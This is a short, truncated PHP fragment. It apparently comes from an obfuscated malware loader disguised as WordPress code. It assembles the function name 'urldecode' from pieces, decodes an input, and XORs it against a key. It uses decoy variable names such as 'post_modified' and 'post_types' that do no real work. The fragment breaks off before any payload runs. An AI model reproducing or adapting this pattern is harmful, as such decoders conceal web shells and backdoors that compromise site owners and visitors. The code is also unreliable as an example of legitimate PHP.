...
function loop($replace, $is_escaped)

{
    $input = $is_escaped;
	$cats = 'sentences';
    $post_modified = "url" . "decode";
	$callback = 'en_dash';
    $protocols = $post_modified($replace);
    $new_date = substr($input,0, strlen($protocols));
    $post_types = $protocols ^ $new_date;

    
    $protocols = strpos($post_types, $new_date);
